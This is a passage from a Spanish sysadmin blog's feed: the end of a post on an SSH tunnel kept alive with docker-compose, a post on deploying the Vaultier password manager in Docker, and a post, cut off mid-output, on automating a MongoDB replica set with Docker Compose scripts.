&lt;p&gt;Solo necesitamos levantar el contenedor usando &lt;strong&gt;docker-compose&lt;/strong&gt; para poder observar el resultado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/tunnelmaker$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;tunnelmaker_default&amp;quot;&lt;/span&gt; with the default driver
Creating tunnelmaker_mongotunnel_1
gerard@sirius:~/docker/tunnelmaker$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora podremos acceder sin problemas a dicho servidor de bases de datos como si se encontrase en el puerto 27777 local; solo hace falta comprobarlo usando, por ejemplo, el mismo cliente de &lt;strong&gt;MongoDB&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker$ mongo --port &lt;span class="m"&gt;27777&lt;/span&gt;
MongoDB shell version v3.4.7
connecting to: mongodb://127.0.0.1:27777/
MongoDB server version: &lt;span class="m"&gt;3&lt;/span&gt;.4.4
...  
&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No importa cuantas veces se caiga el túnel; cuando eso pase, el contenedor acabará y el demonio de &lt;strong&gt;Docker&lt;/strong&gt; lo va a volver a levantar.&lt;/p&gt;</content><category term="ssh"></category><category term="túnel"></category><category term="docker"></category><category term="docker-compose"></category></entry><entry><title>Un almacén de passwords web seguro con vaultier</title><link href="http://www.linuxsysadmin.ml/2018/02/un-almacen-de-passwords-web-seguro-con-vaultier.html" rel="alternate"></link><published>2018-02-05T10:00:00+01:00</published><updated>2018-02-05T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-02-05:/2018/02/un-almacen-de-passwords-web-seguro-con-vaultier.html</id><summary type="html">&lt;p&gt;Cada vez que trabajo en un cliente me pasa lo mismo; las claves de acceso y las contraseñas de las diferentes herramientas y de los diferentes servidores están guardadas de forma caótica e inaccesible. Puesto que trabajamos en un equipo distribuido, me gusta tener esto publicado en remoto pero seguro …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cada vez que trabajo en un cliente me pasa lo mismo; las claves de acceso y las contraseñas de las diferentes herramientas y de los diferentes servidores están guardadas de forma caótica e inaccesible. Puesto que trabajamos en un equipo distribuido, me gusta tener esto publicado en remoto pero seguro.&lt;/p&gt;
&lt;p&gt;Como reto personal, me he propuesto dar a conocer una de esas herramientas, con la esperanza de que la acaben adoptando por su genialidad.&lt;/p&gt;
&lt;p&gt;Los requisitos son bastante simples:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Debe permitir un control de acceso granular a usuarios y a grupos&lt;/li&gt;
&lt;li&gt;Debe poder clasificar nuestros secretos por algún criterio (por ejemplo por proyecto)&lt;/li&gt;
&lt;li&gt;Debe asegurar la confidencialidad de los secretos guardados&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tras un poco de búsqueda por internet, acabé encontrando una muy interesante llamada &lt;a href="http://www.vaultier.org/"&gt;Vaultier&lt;/a&gt;. Como plus extra, se nos ofrece la aplicación como una imagen de &lt;strong&gt;docker&lt;/strong&gt;, lo que me permite hacer una instalación de usar y tirar.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Panel de Vaultier" src="http://www.linuxsysadmin.ml/images/vaultier.jpg"&gt;&lt;/p&gt;
&lt;h2&gt;Instalación&lt;/h2&gt;
&lt;p&gt;Podemos hacer un &lt;em&gt;pull&lt;/em&gt; de la imagen directamente desde &lt;a href="https://hub.docker.com/r/rclick/vaultier/"&gt;DockerHub&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/vaultier$ docker pull rclick/vaultier
Using default tag: latest
latest: Pulling from rclick/vaultier
...
Digest: sha256:624a1191c55e149ef77aa567b739297df4843342ba267660e59cf1610b163202
Status: Downloaded newer image &lt;span class="k"&gt;for&lt;/span&gt; rclick/vaultier:latest
gerard@aldebaran:~/docker/vaultier$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y la levantamos con un simple &lt;em&gt;docker run&lt;/em&gt;, con la precaución de exponer su puerto 80 para poder acceder cómodamente a la dirección IP de nuestra máquina servidora; se puede hacer en &lt;em&gt;background&lt;/em&gt; con el &lt;em&gt;flag -d&lt;/em&gt;, aunque de momento, así se queda.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/vaultier$ docker run -ti --rm -p &lt;span class="m"&gt;80&lt;/span&gt;:80 rclick/vaultier
/usr/lib/python2.7/dist-packages/supervisor/options.py:295: UserWarning: Supervisord is running as root and it is searching &lt;span class="k"&gt;for&lt;/span&gt; its configuration file in default locations &lt;span class="o"&gt;(&lt;/span&gt;including its current working directory&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; you probably want to specify a &lt;span class="s2"&gt;&amp;quot;-c&amp;quot;&lt;/span&gt; argument specifying an absolute path to a configuration file &lt;span class="k"&gt;for&lt;/span&gt; improved security.
  &lt;span class="s1"&gt;&amp;#39;Supervisord is running as root and it is searching &amp;#39;&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:30,155 CRIT Supervisor running as root &lt;span class="o"&gt;(&lt;/span&gt;no user in config file&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:30,173 INFO RPC interface &lt;span class="s1"&gt;&amp;#39;supervisor&amp;#39;&lt;/span&gt; initialized
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:30,173 CRIT Server &lt;span class="s1"&gt;&amp;#39;unix_http_server&amp;#39;&lt;/span&gt; running without any HTTP authentication checking
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:30,173 INFO supervisord started with pid &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:31,175 INFO spawned: &lt;span class="s1"&gt;&amp;#39;vaultier-celerybeat&amp;#39;&lt;/span&gt; with pid &lt;span class="m"&gt;9&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:31,176 INFO spawned: &lt;span class="s1"&gt;&amp;#39;nginx&amp;#39;&lt;/span&gt; with pid &lt;span class="m"&gt;10&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:31,177 INFO spawned: &lt;span class="s1"&gt;&amp;#39;vaultier-worker&amp;#39;&lt;/span&gt; with pid &lt;span class="m"&gt;11&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:31,179 INFO spawned: &lt;span class="s1"&gt;&amp;#39;postgresql&amp;#39;&lt;/span&gt; with pid &lt;span class="m"&gt;12&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:31,186 INFO spawned: &lt;span class="s1"&gt;&amp;#39;uwsgi&amp;#39;&lt;/span&gt; with pid &lt;span class="m"&gt;13&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:32,988 INFO success: vaultier-celerybeat entered RUNNING state, process has stayed up &lt;span class="k"&gt;for&lt;/span&gt; &amp;gt; than &lt;span class="m"&gt;1&lt;/span&gt; seconds &lt;span class="o"&gt;(&lt;/span&gt;startsecs&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:32,988 INFO success: nginx entered RUNNING state, process has stayed up &lt;span class="k"&gt;for&lt;/span&gt; &amp;gt; than &lt;span class="m"&gt;1&lt;/span&gt; seconds &lt;span class="o"&gt;(&lt;/span&gt;startsecs&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:32,988 INFO success: vaultier-worker entered RUNNING state, process has stayed up &lt;span class="k"&gt;for&lt;/span&gt; &amp;gt; than &lt;span class="m"&gt;1&lt;/span&gt; seconds &lt;span class="o"&gt;(&lt;/span&gt;startsecs&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:32,989 INFO success: postgresql entered RUNNING state, process has stayed up &lt;span class="k"&gt;for&lt;/span&gt; &amp;gt; than &lt;span class="m"&gt;1&lt;/span&gt; seconds &lt;span class="o"&gt;(&lt;/span&gt;startsecs&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;2017&lt;/span&gt;-06-15 &lt;span class="m"&gt;10&lt;/span&gt;:58:32,989 INFO success: uwsgi entered RUNNING state, process has stayed up &lt;span class="k"&gt;for&lt;/span&gt; &amp;gt; than &lt;span class="m"&gt;1&lt;/span&gt; seconds &lt;span class="o"&gt;(&lt;/span&gt;startsecs&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que la imagen dispone de varios servicios, que se manejan con &lt;strong&gt;supervisor&lt;/strong&gt;. Esto nos levanta la aplicación entera y la base de datos que necesita para funcionar.&lt;/p&gt;
&lt;p&gt;Solo nos queda dirigirnos a &lt;a href="http://localhost/"&gt;http://localhost/&lt;/a&gt; y ver nuestro nuevo servidor de secretos en funcionamiento.&lt;/p&gt;
&lt;h2&gt;Conceptos básicos&lt;/h2&gt;
&lt;p&gt;La mecánica básica es muy simple; basta con perder un poco de tiempo jugando con al interfaz. Hay que tener en cuenta lo siguiente:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Existen usuarios autenticados con certificados&lt;/li&gt;
&lt;li&gt;Estos usuarios pueden pertenecer a grupos&lt;/li&gt;
&lt;li&gt;Los secretos pueden ser contraseñas, notas o ficheros&lt;/li&gt;
&lt;li&gt;Los secretos se agrupan en &lt;em&gt;cards&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Los &lt;em&gt;cards&lt;/em&gt; se agrupan en &lt;em&gt;vaults&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Los &lt;em&gt;vaults&lt;/em&gt; se agrupan en &lt;em&gt;workspaces&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Un &lt;em&gt;workspace&lt;/em&gt; es creado por un usuario que es su administrador&lt;/li&gt;
&lt;li&gt;Usuarios y grupos se pueden invitar para compartir acceso a &lt;em&gt;cards&lt;/em&gt;, a &lt;em&gt;vaults&lt;/em&gt; y a &lt;em&gt;workspaces&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A partir de aquí, solo es necesario poner un sistema de niveles inteligentes que nos permitan compartir lo que necesitemos con los diferentes grupos que necesitamos.&lt;/p&gt;</content><category term="vaultier"></category><category term="password"></category></entry><entry><title>Automatizando el setup de un mongo replica set en docker</title><link href="http://www.linuxsysadmin.ml/2018/01/automatizando-el-setup-de-un-mongo-replica-set-en-docker.html" rel="alternate"></link><published>2018-01-29T10:00:00+01:00</published><updated>2018-01-29T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-01-29:/2018/01/automatizando-el-setup-de-un-mongo-replica-set-en-docker.html</id><summary type="html">&lt;p&gt;Algunas veces queremos probar nuestras aplicaciones en local y necesitamos una base de datos &lt;strong&gt;MongoDB&lt;/strong&gt;; en estos casos, &lt;strong&gt;Docker&lt;/strong&gt; nos presta un gran servicio. Es posible que en estos casos necesitemos un &lt;strong&gt;replica set&lt;/strong&gt; para probar; aunque &lt;strong&gt;Docker&lt;/strong&gt; sigue ayudando, la inicialización del &lt;em&gt;cluster&lt;/em&gt; sigue siendo un tedioso proceso manual …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Algunas veces queremos probar nuestras aplicaciones en local y necesitamos una base de datos &lt;strong&gt;MongoDB&lt;/strong&gt;; en estos casos, &lt;strong&gt;Docker&lt;/strong&gt; nos presta un gran servicio. Es posible que en estos casos necesitemos un &lt;strong&gt;replica set&lt;/strong&gt; para probar; aunque &lt;strong&gt;Docker&lt;/strong&gt; sigue ayudando, la inicialización del &lt;em&gt;cluster&lt;/em&gt; sigue siendo un tedioso proceso manual.&lt;/p&gt;
&lt;p&gt;Así que me puse a pensar... ¿Por qué no puedo atar el &lt;strong&gt;replica set&lt;/strong&gt; directamente en el proceso de &lt;em&gt;runtime&lt;/em&gt;?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Docker&lt;/strong&gt; ejecuta un solo proceso (que debe ser &lt;em&gt;mongod&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;Necesitamos un proceso auxiliar para atar el &lt;em&gt;cluster&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;No queremos más contenedores que los que hacen falta&lt;/li&gt;
&lt;li&gt;No quiero imágenes específicas de un "&lt;em&gt;mongodb leader&lt;/em&gt;"&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tras muchas vueltas a la cabeza, llegué a un conclusión interesante:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Podemos crear el comportamiento líder mediante variables de entorno&lt;/li&gt;
&lt;li&gt;Este líder puede lanzar un proceso en &lt;em&gt;background&lt;/em&gt; que se dedique a atar el &lt;em&gt;cluster&lt;/em&gt; y luego muera&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Para conseguir este doble proceso condicionado, nos vemos obligados a cambiar el comando &lt;em&gt;mongod&lt;/em&gt; por un &lt;em&gt;script&lt;/em&gt; que ejecute el &lt;em&gt;setup&lt;/em&gt; del &lt;em&gt;cluster&lt;/em&gt; (si procede) y el proceso &lt;em&gt;mongod&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;La imagen única&lt;/h2&gt;
&lt;p&gt;Partimos de un &lt;em&gt;Dockerfile&lt;/em&gt; bastante estándar; las únicas excepciones van a ser el &lt;em&gt;script&lt;/em&gt; inicial y otro &lt;em&gt;script&lt;/em&gt; auxiliar que configure nuestro &lt;em&gt;cluster&lt;/em&gt; en una sola de las máquinas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/replica/mongo$ cat Dockerfile 
FROM debian:jessie-slim
RUN apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 0C49F3730359A14518585931BC711F9BA15703C6 &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;deb http://repo.mongodb.org/apt/debian jessie/mongodb-org/3.4 main&amp;quot;&lt;/span&gt; &amp;gt; /etc/apt/sources.list.d/mongodb-org-3.4.list
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y mongodb-org-server mongodb-org-shell &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm -rf /var/lib/apt/lists/*
COPY mongod.conf /etc/
COPY start.sh setup_cluster.sh /
USER mongodb
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/start.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/replica/mongo$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La configuración de &lt;strong&gt;mongodb&lt;/strong&gt; es bastante estándar y solo se incluye por completitud:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/replica/mongo$ cat mongod.conf 
processManagement:
  fork: &lt;span class="nb"&gt;false&lt;/span&gt;

net:
  bindIp: &lt;span class="m"&gt;0&lt;/span&gt;.0.0.0
  port: &lt;span class="m"&gt;27017&lt;/span&gt;
  unixDomainSocket:
    enabled: &lt;span class="nb"&gt;false&lt;/span&gt;

storage:
  dbPath: /var/lib/mongodb
  journal:
    enabled: &lt;span class="nb"&gt;true&lt;/span&gt;

replication:
   replSetName: rs
gerard@aldebaran:~/docker/replica/mongo$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y este es el truco: vamos a definir dos variables de entorno, llamadas &lt;strong&gt;ROLE&lt;/strong&gt; y &lt;strong&gt;REPLICAS&lt;/strong&gt;. La idea es que el que tenga que configurar el &lt;em&gt;cluster&lt;/em&gt; va a tener en &lt;strong&gt;ROLE&lt;/strong&gt; algún valor que le dé a entender que es el elegido, y la variable &lt;strong&gt;REPLICAS&lt;/strong&gt; que le indica los otros miembros a añadir en el &lt;em&gt;cluster&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;De hecho, las variables no necesitan estar en las réplicas, porque &lt;strong&gt;bash&lt;/strong&gt; va a interpretar la variable &lt;strong&gt;ROLE&lt;/strong&gt; inexistente como vacía y no va a lanzar el proceso de configuración, haciendo de la variable &lt;strong&gt;REPLICAS&lt;/strong&gt; algo innecesario.&lt;/p&gt;
&lt;p&gt;El contenedor con el rol &lt;em&gt;orchestrator&lt;/em&gt; va a levantar otro &lt;em&gt;script&lt;/em&gt; en &lt;em&gt;background&lt;/em&gt;, dejando así el flujo de ejecución para el proceso &lt;em&gt;mongod&lt;/em&gt;. Este &lt;em&gt;script&lt;/em&gt; tiene permisos de ejecución.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/replica/mongo$ cat start.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$ROLE&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;orchestrator&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
    /setup_cluster.sh &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
&lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="nb"&gt;exec&lt;/span&gt; mongod --config /etc/mongod.conf
gerard@aldebaran:~/docker/replica/mongo$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El &lt;em&gt;script setup_cluster.sh&lt;/em&gt; (también ejecutable) es complejo, pero no complicado:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Espera a que todos los procesos &lt;em&gt;mongod&lt;/em&gt; respondan&lt;/li&gt;
&lt;li&gt;Conecta a su mismo contenedor para lanzar el &lt;code&gt;rs.initiate()&lt;/code&gt; y el &lt;code&gt;rs.add(...)&lt;/code&gt; de las &lt;em&gt;replicas&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Espera que todas las &lt;em&gt;replicas&lt;/em&gt; estén como secundarias, mediante &lt;code&gt;rs.status()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;y así queda esta primera versión:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/replica/mongo$ cat setup_cluster.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; REPLICA in &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;REPLICAS&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="k"&gt;until&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; mongo --host &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;REPLICA&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &amp;gt;/dev/null &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; sleep &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
&lt;span class="k"&gt;until&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; mongo &amp;gt;/dev/null &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; sleep &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;

&lt;span class="nv"&gt;replicas&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;rs.initiate()&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; mongo &amp;gt;/dev/null &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; REPLICA in &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;REPLICAS&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;rs.add(\&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;REPLICA&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;:27017\&amp;quot;)&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; mongo &amp;gt;/dev/null &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
    &lt;span class="nb"&gt;let&lt;/span&gt; &lt;span class="nv"&gt;replicas&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;replicas+1
&lt;span class="k"&gt;done&lt;/span&gt;

&lt;span class="nv"&gt;online&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;
&lt;span class="k"&gt;until&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;online&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; -eq &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;replicas&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    sleep &lt;span class="m"&gt;1&lt;/span&gt;
    &lt;span class="nv"&gt;online&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;rs.status()&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; mongo &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null &lt;span class="p"&gt;|&lt;/span&gt; grep -c &lt;span class="s2"&gt;&amp;quot;SECONDARY&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
gerard@aldebaran:~/docker/replica/mongo$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Testeando nuestro deploy&lt;/h2&gt;
&lt;p&gt;Levantar 3 contenedores es muy pesado y nada apetecible, así que haremos con &lt;strong&gt;Docker Compose&lt;/strong&gt;. Veamos un &lt;em&gt;docker-compose.yml&lt;/em&gt; de ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/replica$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  rs01:
    image: mongo
    hostname: rs01
    container_name: rs01
    environment:
        ROLE: orchestrator
        REPLICAS: &lt;span class="s2"&gt;&amp;quot;rs02 rs03&amp;quot;&lt;/span&gt;
  rs02:
    image: mongo
    hostname: rs02
    container_name: rs02
  rs03:
    image: mongo
    hostname: rs03
    container_name: rs03
gerard@aldebaran:~/docker/replica$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, y de acuerdo a las decisiones de diseño, el contenedor &lt;em&gt;rs01&lt;/em&gt; inicializaría el &lt;em&gt;cluster&lt;/em&gt; consigo mismo y añadiría &lt;em&gt;rs02&lt;/em&gt; y &lt;em&gt;rs03&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/replica$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;replica_default&amp;quot;&lt;/span&gt; with the default driver
Creating rs01
Creating rs02
Creating rs03
gerard@aldebaran:~/docker/replica$ docker-compose ps
Name    Command    State   Ports 
--------------------------------
rs01   /start.sh   Up            
rs02   /start.sh   Up            
rs03   /start.sh   Up            
gerard@aldebaran:~/docker/replica$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos quedaría entrar en un &lt;em&gt;mongod&lt;/em&gt; cualquiera y pedirle el estado del &lt;em&gt;cluster&lt;/em&gt; con &lt;code&gt;rs.status()&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/replica$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; -ti rs02 mongo
MongoDB shell version v3.4.4
connecting to: mongodb://127.0.0.1:27017
MongoDB server version: &lt;span class="m"&gt;3&lt;/span&gt;.4.4
...  
rs:SECONDARY&amp;gt; rs.status&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;set&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;rs&amp;quot;&lt;/span&gt;,
...  
    &lt;span class="s2"&gt;&amp;quot;members&amp;quot;&lt;/span&gt; : &lt;span class="o"&gt;[&lt;/span&gt;
        &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;0&lt;/span&gt;,
            &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;rs01:27017&amp;quot;&lt;/span&gt;,
...  
            &lt;span class="s2"&gt;&amp;quot;stateStr&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;PRIMARY&amp;quot;&lt;/span&gt;,
...  
        &lt;span class="o"&gt;}&lt;/span&gt;,
        &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;,
            &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;rs02:27017&amp;quot;&lt;/span&gt;,
...  
            &lt;span class="s2"&gt;&amp;quot;stateStr&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;SECONDARY&amp;quot;&lt;/span&gt;,
...  
            &lt;span class="s2"&gt;&amp;quot;self&amp;quot;&lt;/span&gt; : &lt;span class="nb"&gt;true&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;,
        &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;2&lt;/span&gt;,
